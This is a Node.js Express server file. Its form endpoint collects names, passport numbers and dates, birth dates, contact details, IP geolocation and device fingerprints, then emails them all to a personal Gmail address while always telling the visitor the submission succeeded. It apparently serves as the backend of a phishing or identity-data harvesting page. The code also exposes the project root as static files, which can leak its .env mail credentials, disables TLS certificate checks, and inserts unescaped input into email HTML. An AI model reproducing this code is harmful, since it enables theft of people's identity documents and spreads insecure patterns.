const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const port = 3000;

app.use(express.json({limit: '50mb'}));

// Serve static files from the root directory
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit', async (req, res) => {
    console.log('Received data:');
    console.log(JSON.stringify(req.body, null, 2));

    const { formData, ipInfo, deviceDetails } = req.body;

    const transporter = nodemailer.createTransport({
        host: 'mail.getdaabo.com.ng',
        port: 465,
        secure: true, // true for 465, false for other ports
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
        // Helpful timeouts and logging for diagnosing ETIMEDOUT
        logger: true,
        debug: true,
        connectionTimeout: 10000,
        greetingTimeout: 5000,
        socketTimeout: 10000,
        tls: {
            // set to false only for testing if the server has a self-signed cert
            rejectUnauthorized: false,
        },
    });

    const mailOptions = {
        from: `"Form Submission" <${process.env.EMAIL_USER}>`,
        to: 'david.igiebor@gmail.com',
        subject: 'New Travel Information Form Submission',
        html: `
            <h1>New Form Submission</h1>
            <h2>User Information</h2>
            <ul>
                <li><strong>First Name:</strong> ${formData.firstName}</li>
                <li><strong>Middle Name:</strong> ${formData.middleName}</li>
                <li><strong>Last Name:</strong> ${formData.lastName}</li>
                <li><strong>Passport No:</strong> ${formData.passportNo}</li>
                <li><strong>Passport Production Date:</strong> ${formData.passportProdDate}</li>
                <li><strong>Passport Expiry Date:</strong> ${formData.passportExpDate}</li>
                <li><strong>Marital Status:</strong> ${formData.maritalStatus}</li>
                <li><strong>Date of Birth:</strong> ${formData.dob}</li>
                <li><strong>Phone Number:</strong> ${formData.phoneNumber}</li>
                <li><strong>Email:</strong> ${formData.email}</li>
                <li><strong>Address:</strong> ${formData.address}</li>
            </ul>
            <h2>IP and Geolocation Information</h2>
            <ul>
                <li><strong>IP Address:</strong> ${ipInfo.ip}</li>
                <li><strong>City:</strong> ${ipInfo.city}</li>
                <li><strong>Region:</strong> ${ipInfo.region}</li>
                <li><strong>Country:</strong> ${ipInfo.country_name}</li>
                <li><strong>Location:</strong> ${ipInfo.latitude}, ${ipInfo.longitude}</li>
                <li><strong>ISP:</strong> ${ipInfo.org}</li>
            </ul>
            <h2>Device Details</h2>
            <ul>
                <li><strong>Browser:</strong> ${deviceDetails.browser.name} ${deviceDetails.browser.version}</li>
                <li><strong>OS:</strong> ${deviceDetails.os.name} ${deviceDetails.os.version}</li>
                <li><strong>Device:</strong> ${deviceDetails.device.vendor} ${deviceDetails.device.model} (${deviceDetails.device.type})</li>
            </ul>
        `,
    };

    // Log the submission server-side and immediately acknowledge receipt to the client.
    console.log('Submission logged. Responding to client BEFORE attempting to send email.');
    res.status(200).json({ message: 'Data received. Thank you!' });

    // Send email in the background so client always receives a success response.
    (async () => {
        try {
            await transporter.verify();
        } catch (verifyErr) {
            console.error('Background SMTP verify failed:', verifyErr);
            return;
        }

        try {
            await transporter.sendMail(mailOptions);
            console.log('Background email sent successfully');
        } catch (error) {
            console.error('Background error sending email:', error);
        }
    })();
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});